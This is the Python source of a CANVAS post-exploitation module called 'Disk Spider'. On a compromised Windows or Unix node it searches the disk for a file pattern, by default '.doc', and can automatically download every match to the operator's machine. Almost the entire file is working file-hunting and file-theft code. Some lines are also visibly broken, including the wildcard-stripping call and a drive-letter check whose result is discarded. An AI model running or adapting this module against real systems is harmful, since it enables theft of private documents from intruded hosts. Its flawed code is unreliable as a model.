#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

# info
NAME = "Disk Spider"
VERSION = "1.0"
DESCRIPTION = "Searches a remote node for a file pattern. Optionally can download all matching files automatically." \
              "Please note that searching the primary hard drive and/or downloading files can take a few minutes," \
              "unless CANVAS reports an error just be patient and you should see results."
DOCUMENTATION = {}

# properties
PROPERTY={}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Windows", "All"], ["Unix", "All"] ]

class theexploit(LocalCommand):
    def __init__(self):
        """ init """
        LocalCommand.__init__(self)
        self.result = ""
        self.name = NAME
        self.search_pattern = ".doc"
        self.auto_download  = False
        self.drive_letter   = "c:"  #win32 specific obviously
        self.download_count = 0

    def getArgs(self):
        """ get args """
        self.search_pattern = self.getarg("search_pattern")
        self.auto_download  = self.getarg("auto_download")
        self.drive_letter   = self.getarg("drive_letter")
        ##quick sanity checks on drive letter
        self.drive_letter.replace("\\","")

        if self.drive_letter.find(":") == -1:
            self.drive_letter+=":"

    def spider_disk( self, node ):
        output    = ""
        command   = ""
        file_list = []
        ret = 1

        self.target_ip = node.get_interesting_interface()
        outputdir      = self.output(ip=self.target_ip, subdir="diskspider")

        if node.nodetype in ["win32Node", "win64Node"]:
            # Win32 find() doesn't take wildcards, and will
            # give incorrect results, strip it out
            if "*" in self.search_pattern:
                self.search_pattern = command.replace("*","", command )

            command = "dir /s /b %s\\ | find \"%s\"" % (self.drive_letter, self.search_pattern)

        else :

            # The *nix find() call needs a wildcard so we put one in here
            # for good measure
            if "*" not in self.search_pattern:
                self.search_pattern = "*%s" % self.search_pattern

            command = "find / -name %s" % self.search_pattern

        output  = node.runcommand( command)


        if node.nodetype in ["win32Node", "win64Node"]:
            file_list = output.split("\r\n")
        else:
            file_list = output.split("\n")

        # If auto-download is selected then grab the file

        if self.auto_download:

            for file in file_list:

                ##replace path seperators with '_'  so we save it locally nicely
                local_file=os.path.join(outputdir,file.replace("/","_").replace("\\","_"))

                try:
                    node.download( file, "%s" % (local_file ))
                    self.log("Downloaded %s to %s" % (file, local_file))
                    self.download_count += 1
                except NodeCommandError, e:
                    self.log("Exception when attempting to download: %s (%s). Skipping..." % ( file, e ) )
                    ret = 0
                except:
                    self.log("Unknown error when downloading: %s. Skipping..." % file )
                    ret = 0

        self.log("Here are the matching files for the search pattern: %s" % self.search_pattern)
        self.log("%s" % output)

        if self.autohack_state:
            self.log("Number of files downloaded successfully: %d" % self.download_count)
            self.log("All files downloaded to: %s" % outputdir)

        return ret

    def run(self):
        """ main """

        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()

        for node in self.argsDict["passednodes"]:

            ##We work on anything that can download, anything that is VFS - but localnode doesn't make anysense!
            if "VFS" in node.capabilities and "localnode" not in node.capabilities:
                ret = self.spider_disk( node )
            else:
                self.log("Node type %s not supported by this module"%(node.nodetype))
                ret =0

        return ret

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."

